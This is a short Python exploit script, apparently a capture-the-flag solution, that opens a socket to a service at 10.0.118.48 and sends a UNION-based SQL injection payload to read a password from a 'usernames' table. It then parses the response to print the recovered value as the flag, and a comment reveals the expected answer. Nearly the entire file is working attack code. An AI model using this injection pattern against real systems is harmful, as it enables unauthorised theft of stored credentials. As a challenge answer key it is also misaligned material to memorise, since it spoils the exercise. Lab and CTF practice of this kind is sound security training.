#!/usr/bin/env python3
import re
import socket

HOST = "10.0.118.48"
PORT = 30366

# URL-encoded payload for: ' UNION SELECT 1,password,3 FROM usernames WHERE id=4 --
PAYLOAD = "%27 UNION SELECT 1,password,3 FROM usernames WHERE id=4 --"


def run_once(payload: str) -> str:
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(2)

        banner = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            banner += chunk
            if b">" in banner:
                break

        sock.sendall((payload + "\n").encode())

        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            response += chunk

    return (banner + response).decode(errors="replace")


def extract_flag(output: str) -> str:
    # Expected tuple shape: (1, '"e4syp4asy1234"', 3)
    match = re.search(r"\(1,\s*'([^']*)',\s*3\)", output)
    if match:
        return match.group(1).strip('"')

    # Fallback in case output format changes slightly.
    fallback = re.search(r"([A-Za-z0-9_{}@!\-]{8,})", output)
    if fallback:
        return fallback.group(1)

    raise RuntimeError("Could not parse flag from service response")


def main() -> None:
    output = run_once(PAYLOAD)
    flag = extract_flag(output)

    print("[+] payload:", PAYLOAD)
    print("[+] flag:", flag)


if __name__ == "__main__":
    main()
